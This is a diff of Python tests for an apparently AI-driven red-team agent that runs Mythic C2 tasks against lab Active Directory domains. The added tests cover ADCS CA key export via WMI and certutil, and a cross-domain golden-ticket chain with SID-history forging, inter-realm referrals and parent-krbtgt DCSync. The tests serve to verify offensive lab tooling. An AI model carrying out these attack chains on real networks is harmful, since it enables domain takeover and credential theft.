@@ -1,7 +1,9 @@
 import asyncio
 import base64
+import hashlib
 import json
 import os
+import re
 import sys
 from datetime import datetime, timedelta, timezone
 from contextlib import contextmanager
@@ -9,9 +11,12 @@ from dataclasses import asdict
 from pathlib import Path
 from unittest.mock import patch
 
+import pytest
+
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "ai" / "langgraph"))
 import access_reconciler  # noqa: E402
+import adcs_certificate_materializer  # noqa: E402
 import capabilities  # noqa: E402
 import engagement_state  # noqa: E402
 import engagement_ledger  # noqa: E402
@@ -100,6 +105,16 @@ def _proof_hop(effect, task_id, callback_id="", technique="capability:seed", tar
     )
 
 
+def _bloodhound_zip_bytes() -> bytes:
+    import io
+    import zipfile
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w") as archive:
+        archive.writestr("users.json", json.dumps({"data": ["x" * 256]}))
+    return buf.getvalue()
+
+
 def _write_test_ca_artifact(path: Path) -> Path:
     from cryptography import x509
     from cryptography.hazmat.primitives import hashes, serialization
@@ -144,6 +159,30 @@ def _write_test_ca_artifact(path: Path) -> Path:
         )
         + cert.public_bytes(serialization.Encoding.PEM)
     )
+    return path
+
+
+def _write_test_ca_pfx(path: Path, password: str = "") -> Path:
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.serialization import pkcs12
+
+    source = _write_test_ca_artifact(path.parent / f"{path.stem}.pem.txt")
+    key, cert, _subject = adcs_certificate_materializer.load_ca_key_cert_from_artifact(
+        source,
+        "",
+        "lab-ca",
+    )
+    path.write_bytes(pkcs12.serialize_key_and_certificates(
+        name=b"lab-ca",
+        key=key,
+        cert=cert,
+        cas=None,
+        encryption_algorithm=(
+            serialization.BestAvailableEncryption(password.encode())
+            if password else
+            serialization.NoEncryption()
+        ),
+    ))
     return path
 
 
@@ -265,6 +304,63 @@ def test_collect_graph_inflight_marker_is_task_backed_after_issue(monkeypatch):
     assert mt._collection_in_flight[access_key]["command"] == "execute_assembly"
 
 
+def test_collect_graph_targeted_scope_uses_distinct_inflight_key(monkeypatch):
+    calls = {"issue": 0}
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    base = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    default_key = engagement_state.collection_target_key(base, foothold)
+    targeted_key = engagement_state.collection_target_key(base, foothold, "essos.local")
+    achieved = engagement_state.record_hop_result(
+        base,
+        "collect-graph",
+        default_key,
+        "achieved",
+        {
+            "source": "ingest_collection",
+            "graph_verified": True,
+            "covered_domains": ["north.sevenkingdoms.local"],
+        },
+        "2026-06-17T00:00:00Z",
+    )
+
+    async def fake_reconcile(mythic_tools_obj, now):
+        return [foothold]
+
+    async def fake_tasks(*args, **kwargs):
+        return []
+
+    mt = _make_tools()
+    mt._assembly_file_checks.add("sharphound.exe")
+    mt._engagement_hops = achieved.hops
+    mt._engagement_graph_facts = [
+        engagement_state.GraphFact(
+            "domain-collected:north.sevenkingdoms.local",
+            "bloodhound:domain_info",
+            "2026-06-17T00:00:00Z",
+            600,
+        )
+    ]
+    with patch.object(access_reconciler, "reconcile_access", fake_reconcile), \
+        patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        _split_issue("SharpHound completed", calls, display_id=778):
+        result = asyncio.run(
+            mt.issue_task_and_waitfor_task_output(
+                "execute_assembly",
+                {
+                    "assembly_name": "SharpHound.exe",
+                    "assembly_arguments": "-c All --Domain essos.local --OutputDirectory C:\\Users\\Public",
+                },
+                50,
+                timeout=5,
+            )
+        )
+
+    assert result == "SharpHound completed"
+    assert calls["issue"] == 1
+    assert default_key not in mt._collection_in_flight
+    assert mt._collection_in_flight[targeted_key]["task_id"] == "778"
+
+
 def test_collect_graph_unbacked_inflight_marker_self_heals_and_issues(monkeypatch):
     calls = {"issue": 0}
     foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
@@ -334,6 +430,186 @@ def test_collect_graph_backed_inflight_marker_blocks_with_task_id(monkeypatch):
     assert calls["issue"] == 0
 
 
+def test_collect_graph_completed_marker_blocks_when_valid_artifact_exists(monkeypatch):
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    access_key = engagement_state.access_context_key(state, foothold)
+
+    async def fake_tasks(*args, **kwargs):
+        return [{"display_id": 781, "status": "success", "completed": True}]
+
+    async def fake_latest(callback_id, name_contains):
+        return {"agent_file_id": "file-valid", "filename_utf8": "bloodhound.zip"}
+
+    async def fake_download(*args, **kwargs):
+        return _bloodhound_zip_bytes()
+
+    mt = _make_tools()
+    mt._collection_in_flight[access_key] = {
+        "kind": "collect-graph",
+        "key": access_key,
+        "task_id": "781",
+        "callback_id": "50",
+    }
+
+    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        patch.object(mt, "_latest_download_for_callback", fake_latest), \
+        patch.object(mythic_tools.mythic, "download_file", fake_download):
+        result = asyncio.run(mt._collection_in_flight_blocker(access_key))
+
+    assert "skipped" in result
+    assert "already launched and completed" in result
+    assert access_key in mt._collection_in_flight
+
+
+def test_collect_graph_completed_marker_self_heals_when_no_artifact(monkeypatch):
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    access_key = engagement_state.access_context_key(state, foothold)
+
+    async def fake_tasks(*args, **kwargs):
+        return [{"display_id": 782, "status": "completed", "completed": True}]
+
+    async def fake_latest(callback_id, name_contains):
+        return None
+
+    mt = _make_tools()
+    mt._collection_in_flight[access_key] = {
+        "kind": "collect-graph",
+        "key": access_key,
+        "task_id": "782",
+        "callback_id": "50",
+    }
+
+    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        patch.object(mt, "_latest_download_for_callback", fake_latest):
+        result = asyncio.run(mt._collection_in_flight_blocker(access_key))
+
+    assert result is None
+    assert access_key not in mt._collection_in_flight
+
+
+def test_collect_graph_completed_marker_self_heals_when_artifact_is_invalid(monkeypatch):
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    access_key = engagement_state.access_context_key(state, foothold)
+
+    async def fake_tasks(*args, **kwargs):
+        return [{"display_id": 783, "status": "success", "completed": True}]
+
+    async def fake_latest(callback_id, name_contains):
+        return {"agent_file_id": "file-invalid", "filename_utf8": "bloodhound.zip"}
+
+    async def fake_download(*args, **kwargs):
+        return b"Option 'o' is unknown. Usage: SharpHound.exe -c All"
+
+    mt = _make_tools()
+    mt._collection_in_flight[access_key] = {
+        "kind": "collect-graph",
+        "key": access_key,
+        "task_id": "783",
+        "callback_id": "50",
+    }
+
+    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        patch.object(mt, "_latest_download_for_callback", fake_latest), \
+        patch.object(mythic_tools.mythic, "download_file", fake_download):
+        result = asyncio.run(mt._collection_in_flight_blocker(access_key))
+
+    assert result is None
+    assert access_key not in mt._collection_in_flight
+
+
+def test_collect_graph_completed_failed_status_preserves_existing_self_heal(monkeypatch):
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    access_key = engagement_state.access_context_key(state, foothold)
+    calls = {"latest": 0}
+
+    async def fake_tasks(*args, **kwargs):
+        return [{"display_id": 784, "status": "error", "completed": True}]
+
+    async def fake_latest(callback_id, name_contains):
+        calls["latest"] += 1
+        return {"agent_file_id": "should-not-check"}
+
+    mt = _make_tools()
+    mt._collection_in_flight[access_key] = {
+        "kind": "collect-graph",
+        "key": access_key,
+        "task_id": "784",
+        "callback_id": "50",
+    }
+
+    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        patch.object(mt, "_latest_download_for_callback", fake_latest):
+        result = asyncio.run(mt._collection_in_flight_blocker(access_key))
+
+    assert result is None
+    assert access_key not in mt._collection_in_flight
+    assert calls["latest"] == 0
+
+
+def test_collect_graph_completed_marker_blocks_when_artifact_status_unknown(monkeypatch):
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    access_key = engagement_state.access_context_key(state, foothold)
+
+    async def fake_tasks(*args, **kwargs):
+        return [{"display_id": 785, "status": "success", "completed": True}]
+
+    async def fake_latest(callback_id, name_contains):
+        raise RuntimeError("metadata unavailable")
+
+    mt = _make_tools()
+    mt._collection_in_flight[access_key] = {
+        "kind": "collect-graph",
+        "key": access_key,
+        "task_id": "785",
+        "callback_id": "50",
+    }
+
+    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        patch.object(mt, "_latest_download_for_callback", fake_latest):
+        result = asyncio.run(mt._collection_in_flight_blocker(access_key))
+
+    assert "skipped" in result
+    assert "already launched and completed" in result
+    assert access_key in mt._collection_in_flight
+
+
+def test_collect_graph_completed_marker_blocks_when_artifact_fetch_unknown(monkeypatch):
+    foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
+    state = engagement_state.EngagementState(objective="test", footholds=[foothold])
+    access_key = engagement_state.access_context_key(state, foothold)
+
+    async def fake_tasks(*args, **kwargs):
+        return [{"display_id": 786, "status": "success", "completed": True}]
+
+    async def fake_latest(callback_id, name_contains):
+        return {"agent_file_id": "file-unknown", "filename_utf8": "bloodhound.zip"}
+
+    async def fake_download(*args, **kwargs):
+        raise RuntimeError("download unavailable")
+
+    mt = _make_tools()
+    mt._collection_in_flight[access_key] = {
+        "kind": "collect-graph",
+        "key": access_key,
+        "task_id": "786",
+        "callback_id": "50",
+    }
+
+    with patch.object(mythic_tools.mythic, "get_all_tasks", fake_tasks), \
+        patch.object(mt, "_latest_download_for_callback", fake_latest), \
+        patch.object(mythic_tools.mythic, "download_file", fake_download):
+        result = asyncio.run(mt._collection_in_flight_blocker(access_key))
+
+    assert "skipped" in result
+    assert "already launched and completed" in result
+    assert access_key in mt._collection_in_flight
+
+
 def test_stage_b_collect_graph_skip_requires_graph_corroboration(monkeypatch):
     foothold = _foothold(host="CASTELBLACK", forest="north.sevenkingdoms.local")
     state = engagement_state.EngagementState(objective="test", footholds=[foothold])
@@ -378,7 +654,7 @@ def test_stage_b_collect_graph_skip_requires_graph_corroboration(monkeypatch):
     mt2._engagement_hops = achieved.hops
     mt2._engagement_graph_facts = [
         engagement_state.GraphFact(
-            "domain:north.sevenkingdoms.local",
+            "domain-collected:north.sevenkingdoms.local",
             "bloodhound:domain_info",
             "2026-06-17T00:00:00Z",
             600,
@@ -2416,6 +2692,83 @@ def test_build_capability_commands_adcs_ca_export_uses_wmiexecute_after_remote_e
     }
 
 
+def test_build_capability_commands_adcs_ca_export_apollo_defaults_to_powerpick_orchestration(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
+        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
+    ]
+
+    async def fake_payload_type(callback_id):
+        return "apollo"
+
+    async def fake_select(target_host, target_domain, local_account):
+        return {
+            "id": 91,
+            "account": local_account,
+            "realm": f"{target_host}.{target_domain}",
+            "credential": "CorrectHorseBatteryStaple!",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "adcs-ca-private-key-export",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "13",
+        },
+        {},
+    )))
+
+    assert plan["ok"] is True
+    assert [item["command"] for item in plan["commands"]] == ["powerpick"]
+    script = plan["commands"][0]["parameters"]
+    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in script
+    assert "Start-Sleep -Seconds 45" in script
+    assert "New-PSDrive -Name SAGECA" in script
+    assert "-Credential $cred" in script
+    assert "certutil.exe -f -p" in script
+    assert "PFX_BASE64=" in script
+
+
+def test_build_capability_commands_adcs_ca_export_apollo_preserves_explicit_wmiexecute(monkeypatch):
+    mt = _make_tools()
+    mt._engagement_hops = [
+        _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
+        _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
+    ]
+
+    async def fake_payload_type(callback_id):
+        return "apollo"
+
+    async def fake_select(target_host, target_domain, local_account):
+        return {
+            "id": 91,
+            "account": local_account,
+            "realm": f"{target_host}.{target_domain}",
+            "credential": "CorrectHorseBatteryStaple!",
+        }
+
+    monkeypatch.setattr(mt, "_resolve_payload_type", fake_payload_type)
+    monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
+
+    plan = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "adcs-ca-private-key-export",
+            "target_host": "ca01",
+            "target_domain": "lab.local",
+            "callback_id": "13",
+        },
+        {"adcs_ca_export_command": "wmiexecute"},
+    )))
+
+    assert plan["ok"] is True
+    assert [item["command"] for item in plan["commands"]] == ["wmiexecute", "cat"]
+
+
 def test_build_capability_commands_adcs_ca_export_sharpdpapi_uses_powerpick(monkeypatch):
     mt = _make_tools()
     mt._engagement_hops = [
@@ -2932,8 +3285,9 @@ def test_execute_capability_apollo_remote_exec_records_local_admin_context_proof
     ]
 
 
-def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypatch):
+def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypatch, tmp_path):
     mt = _make_tools()
+    monkeypatch.setenv("SAGE_ENGAGEMENT_STATE_DIR", str(tmp_path))
     mt._engagement_hops = [
         _proof_hop("remote-exec:ca01@lab.local", 7301, callback_id="13"),
         _proof_hop("local-admin:ca01@lab.local", 7302, callback_id="13"),
@@ -2950,7 +3304,9 @@ def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypat
         }
 
     monkeypatch.setattr(mt, "_select_managed_local_admin_credential", fake_select)
-    pfx = base64.b64encode(b"0" + b"A" * 512).decode("ascii")
+    pfx_blob = b"0" + b"A" * 512
+    pfx = base64.b64encode(pfx_blob).decode("ascii")
+    pfx_sha256 = hashlib.sha256(pfx_blob).hexdigest()
     adcs_output = (
         "b'SAGE_CA_EXPORT_PROOF_ca01_13\\r\\n"
         "CA_HOST=CA01\\r\\n"
@@ -2959,7 +3315,7 @@ def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypat
         "CA_ISSUER=CN=LAB-CA\\r\\n"
         "CA_THUMBPRINT=ABCDEF1234\\r\\n"
         "CA_PFX_PATH=C:\\\\Windows\\\\Temp\\\\sage_ca_export_ca01_13.pfx\\r\\n"
-        f"PFX_SHA256={'a' * 64}\\r\\n"
+        f"PFX_SHA256={pfx_sha256}\\r\\n"
         f"PFX_BASE64={pfx}\\r\\n'\n\n"
         "[SAGE OPSEC] footprint total=3"
     )
@@ -2987,6 +3343,11 @@ def test_execute_capability_adcs_ca_export_records_wmiexecute_readback(monkeypat
     assert [item["command"] for item in result["issued"]] == ["wmiexecute", "cat"]
     assert result["issued"][1]["verify_verdict"] == "achieved"
     assert "CorrectHorseBatteryStaple" not in json.dumps(result["issued"])
+    hop = mt._engagement_hops[-1]
+    assert hop.evidence["pfx_artifact_sha256"] == pfx_sha256
+    assert Path(hop.evidence["pfx_artifact_path"]).is_file()
+    assert hop.evidence["probe"]["pfx_artifact_sha256"] == pfx_sha256
+    assert '"pfx_base64":' not in json.dumps(hop.evidence).casefold()
 
 
 def test_execute_capability_adcs_ca_export_returns_key_not_exportable_blocker(monkeypatch):
@@ -3199,14 +3560,19 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     )))
 
     assert plan["ok"] is True
+    # Cross-domain (child->parent) forge: a golden child ticket is not honored directly by the parent, so the
+    # plan forges, obtains an inter-realm referral at the child DC, exchanges that referral for a parent LDAP
+    # service ticket, loads the service ticket, then proves parent reach by replicating the parent krbtgt.
     assert [item["command"] for item in plan["commands"]] == [
         "shell",
         "shell",
         "execute_assembly",
-        "make_token",
-        "ticket_store_add",
-        "ticket_store_list",
-        "shell",
+        "execute_assembly",
+        "execute_assembly",
+        "ticket_cache_purge",
+        "ticket_cache_add",
+        "ticket_cache_list",
+        "dcsync",
     ]
     assert plan["commands"][0]["produces"] == ["kerberos_context_inventory"]
     assert plan["commands"][0]["parameters"] == "klist"
@@ -3220,11 +3586,36 @@ def test_build_capability_commands_forge_selects_krbtgt_key_and_parent_ea_sid():
     assert "/sids:S-1-5-21-444-555-666-519" in rendered
     assert "/ptt" not in rendered
     assert command["produces"] == ["kerberos_ticket_base64"]
-    assert plan["commands"][4]["deferred"] is True
-    assert "kerberos_ticket_base64" in plan["commands"][4]["consumes"]
-    assert plan["commands"][6]["parameters"] == "dir \\\\kingslanding.sevenkingdoms.local\\C$"
-    assert plan["commands"][6]["consumes"] == ["kerberos_ticket_imported", "kerberos_logon_context"]
-    assert "service" not in plan["execution_plan"]["steps"][6]["parameters"]
+    # Inter-realm referral hop: presents the forged ticket to a DC and requests krbtgt/<parent>; its referral
+    # ticket overwrites the kerberos_ticket_base64 slot so the downstream import consumes the referral.
+    referral = plan["commands"][3]
+    referral_args = referral["parameters"]["assembly_arguments"]
+    assert referral_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:krbtgt/sevenkingdoms.local" in referral_args
+    assert referral["deferred"] is True
+    service_ticket = plan["commands"][4]
+    service_args = service_ticket["parameters"]["assembly_arguments"]
+    assert service_args.startswith("asktgs /ticket:{{kerberos_ticket_base64}}")
+    assert "/service:ldap/kingslanding.sevenkingdoms.local" in service_args
+    assert service_ticket["deferred"] is True
+    assert referral["consumes"] == ["kerberos_ticket_base64"]
+    assert referral["produces"] == ["kerberos_ticket_base64"]
+    assert plan["commands"][5]["parameters"] == {"all": True, "serviceName": "", "luid": ""}
+    # Import the parent LDAP service ticket into the current Kerberos context.
+    assert plan["commands"][6]["command"] == "ticket_cache_add"
+    assert plan["commands"][6]["deferred"] is True
+    assert "kerberos_ticket_base64" in plan["commands"][6]["consumes"]
+    assert "kerberos_logon_context" not in plan["commands"][6]["consumes"]
+    assert plan["commands"][6]["parameters"] == {"base64ticket": "{{kerberos_ticket_base64}}"}
+    assert plan["commands"][7]["command"] == "ticket_cache_list"
+    assert plan["commands"][7]["parameters"] == {"luid": "", "getSystemTickets": False}
+    # Parent-DCSync proof: replicate the parent krbtgt from the parent DC (user qualified at issue time).
+    dcsync = plan["commands"][8]
+    assert dcsync["command"] == "dcsync"
+    assert dcsync["parameters"]["domain"] == "sevenkingdoms.local"
+    assert dcsync["parameters"]["user"] == "SEVENKINGDOMS\\krbtgt"
+    assert dcsync["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"
+    assert plan["execution_plan"]["steps"][-1]["operation"] == "drsuapi-dcsync"
     assert plan["action"]["effects"] == ["da:sevenkingdoms.local"]
 
 
@@ -3330,8 +3721,216 @@ def test_build_capability_commands_resolves_source_and_parent_domain_sids():
     assert "/sids:S-1-5-21-444-555-666-519" in rendered
     assert plan["execution_plan"]["steps"][2]["parameters"]["extra_sids"] == ["S-1-5-21-444-555-666-519"]
     assert "service" not in plan["execution_plan"]["steps"][1]["parameters"]
-    assert plan["execution_plan"]["steps"][-1]["parameters"]["resource"] == "\\\\kingslanding.sevenkingdoms.local\\C$"
-    assert "service" not in plan["execution_plan"]["steps"][-1]["parameters"]
+    # Cross-domain proof is a parent-krbtgt DCSync from the parent DC, not a CIFS service-access probe.
+    referral_step = plan["execution_plan"]["steps"][3]
+    assert referral_step["operation"] == "kerberos-inter-realm-referral"
+    assert referral_step["parameters"]["service"] == "krbtgt/sevenkingdoms.local"
+    dcsync_step = plan["execution_plan"]["steps"][-1]
+    assert dcsync_step["operation"] == "drsuapi-dcsync"
+    assert dcsync_step["parameters"]["domain"] == "sevenkingdoms.local"
+    assert dcsync_step["parameters"]["account"] == "krbtgt"
+    assert dcsync_step["parameters"]["dc"] == "kingslanding.sevenkingdoms.local"
+
+
+def test_cross_domain_forge_executor_skips_only_leading_preflight_not_referral_import():
+    # The executor skips redundant current-context preflight steps when a separate preflight already ran. That
+    # heuristic is position-agnostic and ALSO matches the cross-domain chain's core post-forge steps (referral
+    # import, purge, post-import inventory), because their purposes mention the "current Kerberos context" and
+    # the post-import list re-inventories it. Skipping the referral IMPORT collapsed the cross-domain chain live
+    # (referral TGT obtained, never loaded, parent DCSync proof denied). Drive the REAL classifier + skip
+    # predicate over the REAL build payload to lock the position-aware behavior in.
+    mt = _make_tools()
+
+    async def fake_fetch_credentials(now):
+        return [{"id": 12, "account": "krbtgt", "realm": "north.sevenkingdoms.local", "type": "key", "credential_text": "a" * 64}]
+
+    async def fake_resolve_domain_sid(domain):
+        return {"north.sevenkingdoms.local": "S-1-5-21-111-222-333", "sevenkingdoms.local": "S-1-5-21-444-555-666"}.get(domain, "")
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    mt._resolve_domain_sid = fake_resolve_domain_sid
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result="kingslanding.sevenkingdoms.local")
+
+    payload = json.loads(asyncio.run(mt.build_capability_commands(
+        {"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local", "target_domain": "sevenkingdoms.local"},
+        {},
+    )))
+    commands = payload["commands"]
+
+    # Replay the executor's leading-preflight skip exactly as execute_capability does (preflight already ran).
+    issued, core_action_issued = [], False
+    for command_obj in commands:
+        is_pf = mt._capability_executor_is_current_context_preflight(command_obj)
+        if mt._capability_executor_should_skip_leading_preflight(
+            is_pf, preflight_ran=True, refresh_current_context=False, core_action_issued=core_action_issued
+        ):
+            continue
+        if not is_pf:
+            core_action_issued = True
+        issued.append(command_obj["command"])
+
+    # Leading inventory + access-check are skipped (redundant with the separate preflight)…
+    assert issued[0] == "execute_assembly"  # golden forge, not the leading klist/dir
+    # …but every core step after the forge runs — critically the referral import and DCSync.
+    assert "ticket_cache_add" in issued, f"referral import was dropped: {issued}"
+    assert "dcsync" in issued, f"parent DCSync was dropped: {issued}"
+    assert issued.count("execute_assembly") == 3  # golden + referral TGS + LDAP service TGS
+    assert issued[-1] == "dcsync"
+
+
+def test_cross_domain_forge_issue_boundary_matches_current_cache_oracle():
+    mt = _make_tools()
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 12,
+            "account": "krbtgt",
+            "realm": "child.root.local",
+            "type": "key",
+            "credential_text": "a" * 64,
+        }]
+
+    async def no_schema(command, callback_display_id):
+        return []
+
+    async def no_validation(command, parameters, callback_display_id):
+        return None
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    mt._fetch_command_schema = no_schema
+    mt._validate_command_parameters = no_validation
+    mt._resolve_domain_sid = lambda domain: asyncio.sleep(
+        0,
+        result={
+            "child.root.local": "S-1-5-21-111-222-333",
+            "root.local": "S-1-5-21-444-555-666",
+        }.get(domain, ""),
+    )
+    mt._resolve_domain_controller_host = lambda domain: asyncio.sleep(
+        0,
+        result="dc01.root.local",
+    )
+    payload = json.loads(asyncio.run(mt.build_capability_commands(
+        {
+            "capability": "forge-golden-ticket",
+            "domain": "child.root.local",
+            "target_domain": "root.local",
+        },
+        {"child_dc": "dc01.child.root.local"},
+    )))
+    mt._cross_domain_replication_rights.add("root.local")
+    forged_ticket = "A" * 88
+    referral_ticket = "B" * 88
+    service_ticket = "C" * 88
+    outputs = iter([
+        f"[*] base64(ticket.kirbi):\n{forged_ticket}",
+        f"[*] base64(ticket.kirbi):\n{referral_ticket}",
+        f"[*] base64(ticket.kirbi):\n{service_ticket}",
+        "Ticket cache purged.",
+        "Ticket successfully imported.",
+        "Cached Tickets: (1)",
+        "Hash NTLM: 0123456789abcdef0123456789abcdef",
+    ])
+    calls = {}
+
+    with _split_issue(lambda: next(outputs), calls):
+        for command_obj in payload["commands"][2:]:
+            asyncio.run(mt._execute_capability_command(command_obj, 13, timeout=5))
+
+    assert [item["command_name"] for item in calls["issued"]] == [
+        "execute_assembly",
+        "execute_assembly",
+        "execute_assembly",
+        "ticket_cache_purge",
+        "ticket_cache_add",
+        "ticket_cache_list",
+        "dcsync",
+    ]
+    assert service_ticket in calls["issued"][4]["parameters"]["base64ticket"]
+    assert calls["issued"][-1]["parameters"] == {
+        "domain": "root.local",
+        "user": "ROOT\\krbtgt",
+        "dc": "dc01.root.local",
+    }
+
+
+def test_cross_domain_forge_recognizes_parent_dcsync_as_proof():
+    # The cross-domain forge proves the parent boundary by replicating the PARENT krbtgt (DCSync), not by a
+    # service-access probe. The forge verifier only accepted ticket/service-access probes, so a perfect parent
+    # DCSync scored "failed — no forged ticket evidence" and the chain never recorded da:<parent> (stuck 0.444).
+    # verify_output must now map a parent-krbtgt dump to domain_admin (achieved), is_final_probe must recognize
+    # the step, and a CHILD dump must NOT satisfy a PARENT proof (the child FQDN contains the parent label).
+    mt = _make_tools()
+    action = capabilities.CapabilityAction(
+        name="forge-golden-ticket",
+        target="domain=north.sevenkingdoms.local;target_domain=sevenkingdoms.local",
+        preconditions=["krbtgt-hash:north.sevenkingdoms.local"],
+        effects=["da:sevenkingdoms.local"],
+        intent={"capability": "forge-golden-ticket", "domain": "north.sevenkingdoms.local", "target_domain": "sevenkingdoms.local"},
+    )
+    dcsync_cmd = {
+        "command": "dcsync", "expected_probe": "extract_dcsync_secret_probe",
+        "produces": [], "consumes": [], "purpose": "prove parent reach by replicating the parent krbtgt",
+    }
+    inputs = {"target_domain": "sevenkingdoms.local"}
+
+    # The DCSync proof step is the achieving (final) probe of the cross-domain plan.
+    assert mt._capability_executor_is_final_probe(dcsync_cmd) is True
+
+    # A PARENT-domain krbtgt dump proves da:parent.
+    parent_dump = "[DC] 'sevenkingdoms.local'\nSAM Username : krbtgt\naes256_hmac : " + "f" * 64
+    probe, verification = mt._capability_executor_verify_output(action, inputs, 2, parent_dump, dcsync_cmd, capabilities)
+    assert probe.get("domain_admin") is True
+    assert verification.verdict == "achieved"
+
+    # A CHILD-only dump must NOT satisfy the parent proof, even though "north.sevenkingdoms.local" contains
+    # "sevenkingdoms.local" as a substring (boundary match prevents the false positive).
+    child_dump = "[DC] 'north.sevenkingdoms.local'\nSAM Username : krbtgt\naes256_hmac : " + "f" * 64
+    child_probe, child_verif = mt._capability_executor_verify_output(action, inputs, 2, child_dump, dcsync_cmd, capabilities)
+    assert not child_probe.get("domain_admin")
+    assert child_verif.verdict != "achieved"
+
+
+def test_cross_domain_referral_import_grants_rights_and_precheck_honors_it(monkeypatch):
+    # The DCSync rights precheck blocks a premature DCSync (no replication rights, graph populated). The
+    # cross-domain forge's proof DCSync was blocked the same way — even though the imported parent-EA referral
+    # confers the right — so the wall never crossed. After the forge imports the referral, the parent right is
+    # granted and the precheck must let the proof DCSync through. Drive the REAL _engagement_issue_hook seam.
+    mt = _make_tools()
+    mt.client = object()
+
+    async def _ensure_key():
+        return None
+
+    async def _reconcile(self_, now):
+        return []
+
+    async def _corro(now):
+        return []
+
+    async def _refresh(now):
+        return None
+
+    mt._ensure_engagement_key = _ensure_key
+    monkeypatch.setattr(access_reconciler, "reconcile_access", _reconcile)
+    mt._corroboration_facts = _corro
+    mt._refresh_graph_facts_if_stale = _refresh
+    mt._engagement_graph_facts = [object()]  # graph POPULATED -> absence of the right is real evidence
+    mt._engagement_hops = []
+    mt._engagement_footholds = []
+
+    params = {"domain": "sevenkingdoms.local", "user": "SEVENKINGDOMS\\krbtgt", "dc": "kingslanding.sevenkingdoms.local"}
+
+    # Without the grant, the parent DCSync is blocked as a rights problem.
+    blocked = asyncio.run(mt._engagement_issue_hook("dcsync", params, 2))
+    assert blocked is not None and "not attempted" in str(blocked)
+
+    # After the cross-domain forge imports the parent-EA referral, the parent right is granted…
+    mt._cross_domain_replication_rights = {"sevenkingdoms.local"}
+    mt._dcsync_precheck_blocks = {}
+    # …and the precheck lets the proof DCSync through (no block).
+    allowed = asyncio.run(mt._engagement_issue_hook("dcsync", params, 2))
+    assert allowed is None
 
 
 def test_build_capability_commands_ensures_callback_scoped_kerberos_context():
@@ -3837,11 +4436,9 @@ def test_build_capability_commands_supports_adcs_certificate_auth_pkinit():
 
 
 def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses_it(monkeypatch):
-    from cryptography.hazmat.primitives.serialization import pkcs12
-
     state_dir = Path(os.environ["SAGE_ENGAGEMENT_STATE_DIR"])
     artifact_dir = state_dir / "artifacts"
-    ca_artifact = _write_test_ca_artifact(artifact_dir / "adcs_ca_test_ca01_lab.local.pem.txt")
+    ca_artifact = _write_test_ca_pfx(artifact_dir / "adcs_ca_test_ca01_lab.local.pfx", "CA Secret!")
     engagement_ledger.save({
         "engagement_id": "test-op",
         "hops": [
@@ -3889,26 +4486,21 @@ def test_materialize_capability_inputs_stages_adcs_certificate_then_builder_uses
             "ca_host": "ca01",
             "callback_id": "cb13",
         },
-        {"proof_host": "dc01.lab.local", "timeout": 30},
+        {"proof_host": "dc01.lab.local", "timeout": 30, "ca_pfx_password": "CA Secret!"},
     )))
 
     assert materialized["ok"] is True
-    assert materialized["inputs"]["certificate_already_forged"] is True
+    assert "certificate_already_forged" not in materialized["inputs"]
+    assert materialized["inputs"]["ca_pfx_path"] == r"C:\Windows\Temp\sage_ca_signing_administrator_lab_local_13.pfx"
+    assert materialized["inputs"]["ca_pfx_password"] == "CA Secret!"
     assert materialized["inputs"]["forged_pfx_path"] == r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx"
-    assert "ca_pfx_path" not in materialized["inputs"]
-    assert calls["registered_filename"].startswith("adcs_forged_cert_test_op_ca01_lab_local_administrator")
